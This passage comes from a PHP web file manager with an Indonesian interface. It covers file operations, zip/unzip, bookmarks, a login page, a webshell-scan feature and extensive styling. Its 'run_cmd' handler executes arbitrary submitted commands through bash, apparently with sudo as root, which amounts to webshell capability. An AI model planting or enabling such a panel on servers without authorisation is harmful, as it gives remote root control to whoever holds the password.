                    if (file_exists($dest) && $clip['mode'] === 'copy') {
                        $ext = pathinfo($dest, PATHINFO_EXTENSION);
                        $base = pathinfo($dest, PATHINFO_FILENAME);
                        $i = 1;
                        while (file_exists($dest)) {
                            $dest = dirname($s) === $cwd ? $cwd . '/' . $base . '_' . $i . ($ext ? '.' . $ext : '') : dirname($dest) . '/' . $base . '_' . $i . ($ext ? '.' . $ext : '');
                            $i++;
                            if ($i > 50) break;
                        }
                        $conflicts++;
                    }
                    $r = ($clip['mode'] === 'move')
                        ? fs_run('mv ' . escapeshellarg($s) . ' ' . escapeshellarg($dest))
                        : fs_run('cp -r ' . escapeshellarg($s) . ' ' . escapeshellarg($dest));
                    if ($r['code'] === 0) $count++;
                }
                if ($clip['mode'] === 'move') unset($_SESSION['clipboard']);
                flash("$count item di-paste" . ($conflicts ? " ($conflicts di-rename otomatis)" : '') . '.', 'success');
                break;

            case 'zip':
                $targets = isset($_POST['targets']) ? (array)$_POST['targets'] : [];
                if (empty($targets)) throw new Exception('Tidak ada item dipilih.');
                $zipname = basename((isset($_POST['zipname']) ? $_POST['zipname'] : 'archive.zip'));
                if ($zipname === '' || $zipname === '.zip') $zipname = 'archive.zip';
                if (!preg_match('/\.zip$/i', $zipname)) $zipname .= '.zip';
                $names = array();
                foreach ($targets as $t) {
                    $p = safe_path($t, $root);
                    if ($p && $p !== '') $names[] = basename($p);
                }
                if (empty($names)) throw new Exception('Item tidak valid.');
                $arg = '';
                foreach ($names as $n) { $arg .= escapeshellarg($n) . ' '; }
                $inner = 'cd ' . escapeshellarg($cwd) . ' && zip -r ' . escapeshellarg($zipname) . ' ' . $arg;
                $r = fs_run('bash -c ' . escapeshellarg($inner));
                if ($r['code'] !== 0) throw new Exception('Gagal zip (pastikan zip terinstall): ' . $r['output']);
                flash("Arsip dibuat: $zipname", 'success');
                break;

            case 'unzip':
                $target = safe_path((isset($_POST['target']) ? $_POST['target'] : ''), $root);
                if (!$target || $target === '') throw new Exception('File tidak valid.');
                $inner = 'cd ' . escapeshellarg(dirname($target)) . ' && unzip -o ' . escapeshellarg($target);
                $r = fs_run('bash -c ' . escapeshellarg($inner));
                if ($r['code'] !== 0) throw new Exception('Gagal unzip (pastikan unzip terinstall): ' . $r['output']);
                flash('Berhasil di-unzip.', 'success');
                break;

            case 'bookmark_add':
                $bpath = $cwd;
                if (!isset($_SESSION['bookmarks'])) $_SESSION['bookmarks'] = [];
                if (!in_array($bpath, $_SESSION['bookmarks'])) {
                    $_SESSION['bookmarks'][] = $bpath;
                }
                flash("Bookmark ditambahkan: $bpath", 'success');
                break;

            case 'bookmark_del':
                $bpath = (isset($_POST['bpath']) ? $_POST['bpath'] : '');
                if (isset($_SESSION['bookmarks'])) {
                    $_SESSION['bookmarks'] = array_values(array_diff($_SESSION['bookmarks'], [$bpath]));
                }
                flash('Bookmark dihapus.', 'info');
                break;

            case 'run_cmd':
                $cmd = trim((isset($_POST['cmd']) ? $_POST['cmd'] : ''));
                if ($cmd === '') throw new Exception('Perintah kosong.');
                $tcwd = (isset($_SESSION['cwd']) ? $_SESSION['cwd'] : $CONFIG['terminal_root']);
                $tcwd = rtrim($tcwd, '/');
                if ($tcwd === '') $tcwd = '/';

                // Bila shell di-disable, hanya cd yang bisa (pakai PHP), perintah lain ditolak.
                if (!$SHELL_OK) {
                    if (preg_match('/^\s*cd(?:\s+(.+))?$/', $cmd, $m)) {
                        $target = isset($m[1]) ? trim($m[1]) : '~';
                        if ($target === '~' || $target === '') $target = $CONFIG['terminal_root'];
                        $new = ($target[0] === '/') ? $target : $tcwd . '/' . $target;
                        $real = realpath($new);
                        if ($real !== false && is_dir($real)) {
                            $_SESSION['cwd'] = $real;
                            $terminal_out = "cd: $real\n";
                        } else {
                            $terminal_out = "cd: tidak ada direktori: $target\n";
                        }
                    } else {
                        $terminal_out = "Shell disabled di server ini (disable_functions). Hanya perintah `cd` yang tersedia.\n";
                    }
                    break;
                }

                // cd: persist working directory (resolve via root shell)
                if (preg_match('/^\s*cd(?:\s+(.+))?$/', $cmd, $m)) {
                    $target = isset($m[1]) ? trim($m[1]) : '~';
                    if ($target === '~' || $target === '') $target = $CONFIG['terminal_root'];
                    if ($target === '-') { $out = "cd - tidak didukung (stateless).\n"; }
                    else {
                        $new = ($target[0] === '/') ? $target : $tcwd . '/' . $target;
                        $new = normpath($new);
                        $check = $SUDO . 'bash -c ' . escapeshellarg('cd ' . escapeshellarg($new) . ' 2>/dev/null && pwd') . ' 2>&1';
                        $pw = trim(sh_exec($check));
                        if ($pw !== '') {
                            $_SESSION['cwd'] = $pw;
                            $out = "cd: $pw\n";
                        } else {
                            $out = "cd: tidak ada direktori: $target\n";
                        }
                    }
                } else {
                    $cmdline = 'cd ' . escapeshellarg($tcwd) . ' && ' . $cmd;
                    $full = $SUDO . 'bash -c ' . escapeshellarg($cmdline) . ' 2>&1';
                    $out = sh_exec($full);
                    $out = $out === null ? '' : $out;
                    if (trim($out) === '') $out = "(ok, tanpa output)\n";
                }
                $terminal_out = $out;
                break;
        }
    } catch (Exception $e) {
        flash($e->getMessage(), 'error');
    }

    // AJAX: kembalikan JSON (tanpa refresh page)
    if (isset($_POST['ajax']) && $_POST['ajax'] === '1') {
        $ajax_result = array('ok' => true, 'msg' => '', 'type' => 'info');
        if (!empty($_SESSION['flash'])) {
            $ajax_result['ok']   = ($_SESSION['flash']['type'] !== 'error');
            $ajax_result['msg']  = $_SESSION['flash']['msg'];
            $ajax_result['type'] = $_SESSION['flash']['type'];
            unset($_SESSION['flash']);
        }
        // Untuk scan webshell: kirim daftar file mencurigakan agar icon bisa ditandai langsung (tanpa refresh)
        if ($action === 'scan_webshell') {
            $ajax_result['hits'] = isset($_SESSION['webshell_hits']) ? array_keys($_SESSION['webshell_hits']) : array();
        }
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode($ajax_result);
        exit;
    }

    if (in_array($action, ['create_file','create_dir','rename','delete','chmod','chown','touch','save_file','upload','search','grep','scan_webshell','copy_selected','move_selected','clear_clipboard','paste','zip','unzip','bookmark_add','bookmark_del'])) {
        header('Location: ' . $_SERVER['PHP_SELF'] . '?p=' . urlencode($cwd));
        exit;
    }
}

/* Terminal juga bisa dijalankan via GET? Tidak — hanya POST. */

if (!empty($_SESSION['flash'])) {
    $flash_msg = $_SESSION['flash'];
    unset($_SESSION['flash']);
}

/* ---------------------- DOWNLOAD HANDLER ---------------------- */
if ($authed && isset($_GET['download'])) {
    $f = safe_path($_GET['download'], $CONFIG['root']);
    if ($f && $f !== '') {
        $content = root_cat($f);
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . strlen($content));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        echo $content;
        exit;
    }
}

/* ---------------------- PREVIEW HANDLER (inline image/video/audio) ---------------------- */
if ($authed && isset($_GET['preview'])) {
    $f = safe_path($_GET['preview'], $CONFIG['root']);
    if ($f && $f !== '') {
        $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
        $mimes = array('png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif',
                       'webp'=>'image/webp','svg'=>'image/svg+xml','ico'=>'image/x-icon','bmp'=>'image/bmp',
                       'mp4'=>'video/mp4','webm'=>'video/webm','mov'=>'video/quicktime','m4v'=>'video/mp4',
                       'mp3'=>'audio/mpeg','wav'=>'audio/wav','ogg'=>'audio/ogg','m4a'=>'audio/mp4','flac'=>'audio/flac',
                       'txt'=>'text/plain','md'=>'text/plain','log'=>'text/plain','html'=>'text/html');
        $mime = isset($mimes[$ext]) ? $mimes[$ext] : 'application/octet-stream';
        header('Content-Type: ' . $mime);
        header('Content-Disposition: inline; filename="' . basename($f) . '"');
        header('Cache-Control: no-cache');
        // streaming (tidak memuat seluruh file ke memori — penting utk video besar)
        if ($SUDO === '') {
            @readfile($f);
        } elseif (function_exists('passthru') && !in_array('passthru', $DISABLED)) {
            @passthru($SUDO . 'cat ' . escapeshellarg($f) . ' 2>/dev/null');
        } else {
            echo sh_exec($SUDO . 'cat ' . escapeshellarg($f) . ' 2>/dev/null');
        }
        exit;
    }
}

/* ---------------------- LOGIN PAGE ---------------------- */
if (!$authed) {
    ?><!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Login — File Manager</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
<style>
* { box-sizing: border-box; }
body {
  margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center;
  background:#0a0a0a;
  background-image:
    radial-gradient(700px 400px at 15% 10%, rgba(34,197,94,.13) 0%, transparent 55%),
    radial-gradient(700px 500px at 85% 90%, rgba(16,185,129,.10) 0%, transparent 55%),
    radial-gradient(900px 500px at 50% -10%, #0d1f16 0%, rgba(13,31,22,0) 60%);
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Arial,sans-serif;
  -webkit-font-smoothing:antialiased;
}
.card {
  background:rgba(18,18,18,.85); backdrop-filter:blur(14px); -webkit-backdrop-filter:blur(14px);
  padding:42px 38px 34px; border-radius:20px; width:360px; text-align:center;
  box-shadow:0 30px 80px -18px rgba(0,0,0,.8);
  border:1px solid rgba(34,197,94,.25);
  animation:pop .35s cubic-bezier(.4,0,.2,1);
}
@keyframes pop { from { opacity:0; transform:scale(.95) translateY(12px);} to { opacity:1; transform:none;} }
.logo {
  width:72px; height:72px; margin:0 auto 18px; border-radius:20px;
  display:flex; align-items:center; justify-content:center; font-size:32px; color:#0a0a0a;
  background:linear-gradient(135deg,#22c55e,#10b981);
  box-shadow:0 12px 30px -8px rgba(34,197,94,.55);
}
h1 { color:#e6e6e6; font-size:21px; margin:0 0 6px; font-weight:700; letter-spacing:-.3px; }
p.sub { color:#8a8a8a; font-size:13px; margin:0 0 26px; }
.input-wrap { position:relative; margin-bottom:16px; }
.input-wrap i {
  position:absolute; left:15px; top:50%; transform:translateY(-50%);
  color:#5f5f5f; font-size:14px; pointer-events:none;
}
.input-wrap input {
  width:100%; padding:13px 14px 13px 42px; border-radius:12px;
  border:1px solid #2a2a2a; background:#0a0a0a; color:#e6e6e6; font-size:14px;
  transition:border-color .18s, box-shadow .18s;
}
.input-wrap input::placeholder { color:#5f5f5f; }
.input-wrap input:focus {
  border-color:#22c55e; outline:none;
  box-shadow:0 0 0 4px rgba(34,197,94,.18);
}
button {
  width:100%; padding:13px; border:none; border-radius:12px; cursor:pointer;
  background:linear-gradient(135deg,#22c55e,#16a34a); color:#0a0a0a; font-size:14px; font-weight:700;
  display:flex; align-items:center; justify-content:center; gap:8px;
  box-shadow:0 10px 26px -10px rgba(34,197,94,.6);
  transition:filter .18s, transform .18s;
}
button:hover { filter:brightness(1.08); transform:translateY(-2px); }
button:active { transform:translateY(0); }
.err {
  color:#fca5a5; font-size:13px; margin-top:14px; text-align:left;
  background:rgba(239,68,68,.12); padding:11px 13px; border-radius:10px;
  border:1px solid rgba(239,68,68,.3); display:flex; align-items:center; gap:8px;
}
.err i { color:#ef4444; }
</style>
</head>
<body>
<form class="card" method="post" id="loginForm" onsubmit="doLogin(event); return false;">
  <div class="logo"><i class="fa-solid fa-folder-tree"></i></div>
  <h1>File Manager</h1>
  <p class="sub">Admin Panel · masukkan password untuk lanjut</p>
  <div class="input-wrap">
    <i class="fa-solid fa-lock"></i>
    <input type="password" name="password" id="loginPass" placeholder="Password" autofocus required>
  </div>
  <button type="submit" id="loginBtn"><i class="fa-solid fa-arrow-right-to-bracket"></i> Masuk</button>
  <div class="err" id="loginErr" style="display:none;"></div>
</form>
<script>
function swapPage(url) {
  fetch(url).then(function(r) { return r.text(); }).then(function(html) {
    document.open(); document.write(html); document.close();
  }).catch(function() { location.href = url; });
}
function doLogin(e) {
  e.preventDefault();
  var pass = document.getElementById('loginPass').value;
  var btn = document.getElementById('loginBtn');
  var err = document.getElementById('loginErr');
  if (!pass) return;
  btn.disabled = true;
  btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Masuk...';
  var fd = new FormData();
  fd.append('password', pass);
  fd.append('ajax', '1');
  fetch(window.location.href, { method: 'POST', body: fd })
    .then(function(r) { return r.json(); })
    .then(function(res) {
      if (res.ok) { swapPage(window.location.href); }
      else {
        err.style.display = 'flex';
        err.innerHTML = '<i class="fa-solid fa-circle-exclamation"></i> ' + res.msg;
        btn.disabled = false;
        btn.innerHTML = '<i class="fa-solid fa-arrow-right-to-bracket"></i> Masuk';
      }
    })
    .catch(function() {
      err.style.display = 'flex';
      err.innerHTML = '<i class="fa-solid fa-circle-exclamation"></i> Gagal (jaringan).';
      btn.disabled = false;
      btn.innerHTML = '<i class="fa-solid fa-arrow-right-to-bracket"></i> Masuk';
    });
  return false;
}
</script>
</body>
</html><?php
    exit;
}

/* ---------------------- MAIN UI ---------------------- */

$root = $CONFIG['root'];
$start_dir = (isset($CONFIG['start_dir']) ? $CONFIG['start_dir'] : $root);
$req_path = (isset($_GET['p']) ? $_GET['p'] : $start_dir);
$cwd = safe_path($req_path, $root);
if ($cwd === null || $cwd === '') $cwd = $start_dir;
// validasi direktori (pakai shell bila ada, fallback is_dir bila tidak)
if ($SHELL_OK) {
    if (fs_run('test -d ' . escapeshellarg($cwd))['code'] !== 0) $cwd = $start_dir;
} else {
    if (!is_dir($cwd)) $cwd = $start_dir;
}

// Sinkronkan terminal ke folder browser HANYA saat browser navigasi (folder berubah).
// Kalau user cd manual di terminal, tetap dipertahankan sampai browser navigasi lagi.
if (!empty($CONFIG['terminal_follows_browser'])) {
    if (!isset($_SESSION['last_browser_cwd']) || $_SESSION['last_browser_cwd'] !== $cwd) {
        $_SESSION['cwd'] = $cwd;
    }
    $_SESSION['last_browser_cwd'] = $cwd;
}

$items = list_dir($cwd);

// Read file for viewing/editing
$viewing = null;
$editing = null;
if (isset($_GET['edit'])) {
    $editing = safe_path($_GET['edit'], $root);
    if ($editing && $editing !== '') {
        $sz = root_filesize($editing);
        if ($sz >= 0 && $sz <= $CONFIG['max_edit_size']) {
            $edit_content = root_cat($editing);
        } else {
            $editing = null;
            flash('File tidak bisa dibuka (terlalu besar / bukan file).', 'error');
        }
    }
}
if (isset($_GET['view'])) {
    $viewing = safe_path($_GET['view'], $root);
    if ($viewing && $viewing !== '') {
        $sz = root_filesize($viewing);
        if ($sz >= 0 && $sz <= $CONFIG['max_edit_size']) {
            $view_content = root_cat($viewing);
        } else {
            $viewing = null;
            flash('File tidak bisa ditampilkan (terlalu besar / bukan file).', 'error');
        }
    }
}
// Apakah file yang di-view media (gambar/video/audio)?
$view_is_image = ($viewing && preg_match('/\.(png|jpe?g|gif|webp|svg|ico|bmp)$/i', $viewing));
$view_is_video = ($viewing && preg_match('/\.(mp4|webm|mov|m4v)$/i', $viewing));
$view_is_audio = ($viewing && preg_match('/\.(mp3|wav|ogg|m4a|flac)$/i', $viewing));

$term_cwd = (isset($_SESSION['cwd']) ? $_SESSION['cwd'] : $CONFIG['terminal_root']);
$term_cwd = rtrim($term_cwd, '/');
if ($term_cwd === '') $term_cwd = '/';

// Deteksi user untuk tampilan terminal
$web_user = trim(sh_exec('whoami 2>&1'));   // user web server (www-data, nginx, dll.)
// $sudo_ok sudah dihitung di blok SUDO/ROOT INFRA (di atas)
$whoami = $sudo_ok ? 'root' : $web_user;

// Hasil pencarian
$search_q = (isset($_SESSION['search_query']) ? $_SESSION['search_query'] : '');
$search_results = (isset($_SESSION['search_results']) ? $_SESSION['search_results'] : '');
$search_cwd = (isset($_SESSION['search_cwd']) ? $_SESSION['search_cwd'] : '');
$search_mode = (isset($_SESSION['search_mode']) ? $_SESSION['search_mode'] : 'name');

// Daftar file mencurigakan hasil scan webshell (untuk ditandai di listing)
$webshell_hits = (isset($_SESSION['webshell_hits']) && is_array($_SESSION['webshell_hits'])) ? $_SESSION['webshell_hits'] : [];

// Clipboard & bookmarks
$clipboard = (isset($_SESSION['clipboard']) ? $_SESSION['clipboard'] : null);
$bookmarks = (isset($_SESSION['bookmarks']) && is_array($_SESSION['bookmarks'])) ? $_SESSION['bookmarks'] : [];

// Info server untuk dashboard (dilewati saat AJAX biar ringan)
$list_only = isset($_GET['list']) || isset($_GET['nav']);
if ($list_only) {
    $sinfo = array('uptime'=>'','load'=>'','ram_total'=>0,'ram_used'=>0,'ram_pct'=>0,'disk_size'=>'','disk_used'=>'','disk_pct'=>0,'cores'=>'','host'=>'','kernel'=>'','os'=>'');
    $tree_html = isset($_GET['list']) ? '' : render_tree(folder_tree($root, 2), $root); // nav tetap butuh sidebar
} else {
    $sinfo = server_info();
    $tree_html = render_tree(folder_tree($root, 2), $root);
}

// Breadcrumb
$crumbs = [];
$rel = ltrim(substr($cwd, strlen(rtrim($root, '/'))), '/');
$acc = rtrim($root, '/');
$crumbs[] = ['label' => '/', 'path' => $root];
if ($rel !== '') {
    foreach (explode('/', $rel) as $part) {
        $acc .= '/' . $part;
        $crumbs[] = ['label' => $part, 'path' => $acc];
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>File Manager — <?= h($cwd) ?></title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
<?php if ($editing || $viewing): ?>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/material-darker.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/dialog/dialog.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/hint/show-hint.min.css">
<?php endif; ?>
<style>
/* ===================== DESIGN TOKENS ===================== */
:root {
  --bg:#0a0a0a;
  --panel:#121212;
  --panel-2:#1a1a1a;
  --border:#2a2a2a;
  --border-soft:#202020;
  --text:#e6e6e6;
  --muted:#8a8a8a;
  --muted-2:#5f5f5f;
  --accent:#22c55e;
  --accent-strong:#16a34a;
  --accent-soft:rgba(34,197,94,.14);
  --green:#34d399;
  --green-strong:#10b981;
  --green-soft:rgba(16,185,129,.13);
  --red:#f87171;
  --red-soft:rgba(239,68,68,.13);
  --amber:#fbbf24;
  --amber-soft:rgba(245,158,11,.13);
  --radius:12px;
  --radius-sm:8px;
  --shadow:0 12px 32px -14px rgba(0,0,0,.6);
  --shadow-sm:0 2px 10px rgba(0,0,0,.35);
  --font:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,"Helvetica Neue",Arial,sans-serif;
  --mono:ui-monospace,"SF Mono",SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
  --t:.18s cubic-bezier(.4,0,.2,1);
}
* { box-sizing:border-box; }
html { scroll-behavior:smooth; }
body {
  margin:0; min-height:100vh;
  background:var(--bg) radial-gradient(1100px 500px at 50% -8%, #0d1f16 0%, rgba(13,31,22,0) 60%);
  color:var(--text);
  font-family:var(--font);
  font-size:14px;
  -webkit-font-smoothing:antialiased;
}
::selection { background:var(--accent); color:#0a0a0a; }
::-webkit-scrollbar { width:11px; height:11px; }
::-webkit-scrollbar-track { background:transparent; }
::-webkit-scrollbar-thumb { background:#1e3a2a; border-radius:8px; border:2px solid var(--bg); }
::-webkit-scrollbar-thumb:hover { background:#2a523a; }
a { color:#4ade80; text-decoration:none; transition:color var(--t); }
a:hover { color:#86efac; }

/* ===================== TOPBAR ===================== */
.topbar {
  position:sticky; top:0; z-index:50;
  display:flex; align-items:center; gap:14px;
  padding:12px 20px;
  background:rgba(10,10,10,.85);
  backdrop-filter:blur(12px);
  -webkit-backdrop-filter:blur(12px);
  border-bottom:1px solid var(--border);
  flex-wrap:wrap;
}
.topbar h1 { font-size:15px; margin:0; font-weight:700; letter-spacing:-.2px; display:flex; align-items:center; gap:8px; }
.topbar .spacer { flex:1; }
.topbar .status-pill {
  font-size:11.5px; font-weight:600; padding:4px 10px; border-radius:999px;
  display:inline-flex; align-items:center; gap:5px;
  border:1px solid var(--border);
}
.status-pill.ok { color:var(--green); background:var(--green-soft); border-color:rgba(16,185,129,.3); }
.status-pill.warn { color:var(--amber); background:var(--amber-soft); border-color:rgba(245,158,11,.3); }
.topbar .navlink { color:var(--muted); font-size:13px; padding:6px 10px; border-radius:var(--radius-sm); transition:all var(--t); }
.topbar .navlink:hover { color:var(--text); background:var(--panel-2); }
.topbar a.logout { color:var(--red); }

/* ===================== PATH BAR ===================== */
.pathbar { padding:14px 20px 0; max-width:1400px; margin:0 auto; }
.pathbar-row { display:flex; align-items:center; gap:6px; flex-wrap:wrap; }
.pathbtn {
  display:inline-flex; align-items:center; justify-content:center;
  width:32px; height:32px; border-radius:8px; color:var(--muted);
  background:var(--panel); border:1px solid var(--border);
  cursor:pointer; font-size:13px; text-decoration:none; transition:all var(--t);
  flex-shrink:0;
}
.pathbtn:hover { color:var(--text); background:var(--panel-2); border-color:#314161; }
.pathbtn.auto-on { color:var(--accent); background:var(--accent-soft); border-color:var(--accent); animation:wsPulse 1.5s ease-in-out infinite; }
.pathbar .pathform { display:flex; gap:8px; align-items:center; margin-top:8px; }
.pathbar .pathlabel { font-size:15px; color:var(--accent); }
.pathbar input {
  flex:1; background:var(--panel); border:1px solid var(--border); color:var(--text);
  padding:9px 14px; border-radius:var(--radius-sm); font-family:var(--mono); font-size:13px;
  transition:border-color var(--t), box-shadow var(--t);
}
.pathbar input:focus { border-color:var(--accent); outline:none; box-shadow:0 0 0 3px var(--accent-soft); }
.pathbar .pathform button {
  background:linear-gradient(180deg,var(--accent),var(--accent-strong)); color:#fff; border:none;
  padding:9px 18px; border-radius:var(--radius-sm); cursor:pointer; font-weight:600; font-size:13px;
  box-shadow:0 4px 14px -4px rgba(59,130,246,.5);
  transition:filter var(--t), transform var(--t);
}
.pathbar .pathform button:hover { filter:brightness(1.08); transform:translateY(-1px); }
.pathbar .pathform button:active { transform:translateY(0); }

.crumbs { display:flex; flex-wrap:wrap; align-items:center; gap:2px; font-size:13.5px; color:var(--muted); min-width:0; }
.crumbs a {
  color:var(--muted); padding:4px 9px; border-radius:7px; white-space:nowrap;
  transition:all var(--t); font-family:var(--mono); font-size:12.5px;
}
.crumbs a:hover { color:var(--text); background:var(--panel-2); text-decoration:none; }
.crumbs .sep { margin:0 1px; color:#3b4a63; font-size:10px; }

/* Tombol TERMINAL besar */
.term-big-btn {
  display:inline-flex; align-items:center; gap:10px;
  padding:12px 22px; margin:0 0 14px;
  background:linear-gradient(135deg,#0c0c0c,#1a1a1a); color:#fff;
  border:1px solid #333; border-radius:10px;
  font-family:Consolas,'Courier New',monospace; font-size:14px; font-weight:700; letter-spacing:1px;
  cursor:pointer; transition:all var(--t);
  box-shadow:0 6px 18px -6px rgba(0,0,0,.5);
}
.term-big-btn i { color:#34d399; font-size:16px; }
.term-big-btn:hover { background:linear-gradient(135deg,#111,#222); border-color:#34d399; transform:translateY(-1px); }
.term-big-btn:active { transform:translateY(0); }

/* ===================== LAYOUT ===================== */
.wrap { padding:0 20px 40px; max-width:1400px; margin:0 auto; }

/* ===================== LAYOUT + SIDEBAR ===================== */
.layout { display:flex; gap:16px; align-items:flex-start; }
.main-content { flex:1; min-width:0; }
.sidebar {
  width:240px; flex-shrink:0; position:sticky; top:70px; max-height:calc(100vh - 90px);
  background:var(--panel); border:1px solid var(--border); border-radius:var(--radius);
  overflow-y:auto; display:none; box-shadow:var(--shadow-sm);
}
.sidebar.show { display:block; }
.sidebar-head {
  display:flex; align-items:center; justify-content:space-between;
  padding:10px 12px; border-bottom:1px solid var(--border-soft); font-size:13px; font-weight:600;
}
.sidebar-body { padding:8px; }
.tree-root {
  display:flex; align-items:center; gap:7px; padding:7px 10px; border-radius:7px;
  color:var(--text); font-family:var(--mono); font-size:12.5px; margin-bottom:4px;
  background:var(--panel-2);
}
.tree-root:hover { background:var(--accent-soft); text-decoration:none; }
.tree-ul { list-style:none; margin:0; padding:0 0 0 6px; }
.tree-ul .tree-ul { padding-left:14px; }
.tree-ul li { margin:1px 0; }
.tree-ul a, .tree-ul summary {
  display:flex; align-items:center; gap:7px; padding:5px 8px; border-radius:6px;
  color:var(--muted); font-size:12.5px; font-family:var(--mono); cursor:pointer;
}
.tree-ul a:hover, .tree-ul summary:hover { color:var(--text); background:var(--panel-2); text-decoration:none; }
.tree-ul summary { list-style:none; }
.tree-ul summary::-webkit-details-marker { display:none; }
.tree-ul summary::before { content:'▸'; font-size:10px; color:var(--muted-2); margin-right:2px; }
.tree-ul details[open] > summary::before { content:'▾'; }
.tree-ul a i, .tree-ul summary i { color:var(--amber); font-size:12px; }
@media (max-width:900px) {
  .layout { flex-direction:column; }
  .sidebar { width:100%; position:static; }
}

/* ===================== FLASH ===================== */
.flash {
  padding:11px 16px; border-radius:var(--radius-sm); margin:12px 0; font-size:13px; font-weight:500;
  border:1px solid transparent; display:flex; align-items:center; gap:8px;
  animation:slideIn .25s ease;
}
@keyframes slideIn { from { opacity:0; transform:translateY(-6px);} to { opacity:1; transform:none;} }
.flash.success { background:var(--green-soft); color:#6ee7b7; border-color:rgba(16,185,129,.3); }
.flash.error { background:var(--red-soft); color:#fca5a5; border-color:rgba(239,68,68,.3); }
.flash.warn { background:var(--amber-soft); color:#fcd34d; border-color:rgba(245,158,11,.3); }
.flash.info { background:var(--accent-soft); color:#86efac; border-color:rgba(34,197,94,.3); }

/* ===================== DASHBOARD ===================== */
.dash { padding:14px 16px; }
.dash-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(150px, 1fr)); gap:14px; }
.dash-item { min-width:0; }
.dash-label { color:var(--muted); font-size:11px; text-transform:uppercase; letter-spacing:.4px; margin-bottom:5px; display:flex; align-items:center; gap:6px; }
.dash-val { font-size:15px; font-weight:600; color:var(--text); word-break:break-word; }
.dash-val.small { font-size:13px; }
.dash-sub { color:var(--muted-2); font-size:11px; margin-top:3px; }
.bar { height:6px; background:var(--panel-2); border-radius:4px; margin-top:6px; overflow:hidden; }
.bar-fill { height:100%; background:linear-gradient(90deg,var(--accent),var(--green)); border-radius:4px; transition:width .4s ease; }
.bar-fill.warn { background:linear-gradient(90deg,#f59e0b,#ef4444); }

/* ===================== MODAL (chmod) ===================== */
.modal-overlay {
  position:fixed; inset:0; z-index:100;
  background:rgba(0,0,0,.6); backdrop-filter:blur(3px);
  display:flex; align-items:center; justify-content:center; padding:20px;
}
.modal {
  background:var(--panel); border:1px solid var(--border); border-radius:var(--radius);
  padding:22px; width:100%; max-width:420px; box-shadow:var(--shadow);
  animation:pop .2s ease;
}
.modal h3 { margin:0 0 8px; font-size:16px; display:flex; align-items:center; gap:8px; }
.modal-path { font-family:var(--mono); font-size:12px; color:var(--muted); word-break:break-all; margin-bottom:14px; }

/* Editor modal (lebar & tinggi, biar nyaman buat coding) */
.editor-overlay { align-items:center; }
.editor-modal { max-width:1100px; width:96%; max-height:92vh; display:flex; flex-direction:column; padding:18px 20px; }
.editor-modal .CodeMirror { height:55vh; flex:1; }
.editor-modal textarea#editor { height:55vh; }
.chmod-grid { width:100%; border-collapse:collapse; }
.chmod-grid th, .chmod-grid td { padding:7px 10px; text-align:center; border-bottom:1px solid var(--border-soft); }
.chmod-grid th { color:var(--muted); font-size:11px; text-transform:uppercase; letter-spacing:.4px; }
.chmod-grid td:first-child { text-align:left; font-weight:600; color:var(--text); }
.chmod-grid input[type=checkbox] { width:16px; height:16px; }
.modal-result { margin-top:12px; font-size:14px; }
.modal-result b { font-family:var(--mono); color:var(--accent); font-size:16px; }

/* ===================== DROP OVERLAY ===================== */
#dropOverlay {
  position:fixed; inset:0; z-index:200; background:rgba(10,10,10,.8);
  backdrop-filter:blur(4px); display:flex; align-items:center; justify-content:center;
}
.drop-box {
  border:2px dashed var(--accent); border-radius:var(--radius); padding:50px 70px;
  text-align:center; color:var(--text); background:var(--panel);
}
.drop-box i { font-size:42px; color:var(--accent); margin-bottom:12px; }

/* ===================== UPLOAD PROGRESS ===================== */
.upload-progress { margin:10px 0; padding:12px 14px; background:var(--panel); border:1px solid var(--border); border-radius:10px; }
.upload-progress-info { display:flex; gap:6px; font-size:12.5px; color:var(--muted); margin-bottom:8px; }
.upload-progress .bar { height:8px; background:var(--panel-2); border-radius:5px; overflow:hidden; }
.upload-progress .bar-fill { height:100%; background:linear-gradient(90deg,var(--accent),var(--green)); border-radius:5px; transition:width .2s ease; }

/* ===================== TOAST ===================== */
.toast {
  position:fixed; top:18px; right:18px; z-index:400;
  background:var(--panel); border:1px solid var(--border); border-radius:10px;
  padding:12px 18px; color:var(--text); font-size:13.5px; box-shadow:var(--shadow);
  opacity:0; transform:translateY(-10px); transition:all .3s ease;
  max-width:340px; word-break:break-word;
}
.toast.show { opacity:1; transform:translateY(0); }
.toast.success { border-left:4px solid var(--green); }
.toast.error { border-left:4px solid var(--red); }
.toast.warn { border-left:4px solid var(--amber); }
.toast.info { border-left:4px solid var(--accent); }

/* ===================== GRID VIEW ===================== */
.grid-view { display:grid; grid-template-columns:repeat(auto-fill, minmax(120px, 1fr)); gap:14px; margin-top:4px; }
.grid-card {
  background:var(--panel); border:1px solid var(--border); border-radius:var(--radius-sm);
  overflow:hidden; cursor:pointer; transition:all var(--t); text-align:center;
}
.grid-card:hover { border-color:var(--accent); transform:translateY(-2px); box-shadow:var(--shadow-sm); }
.grid-thumb { height:90px; display:flex; align-items:center; justify-content:center; font-size:34px; background:var(--panel-2); }
.grid-thumb img { width:100%; height:100%; object-fit:cover; }
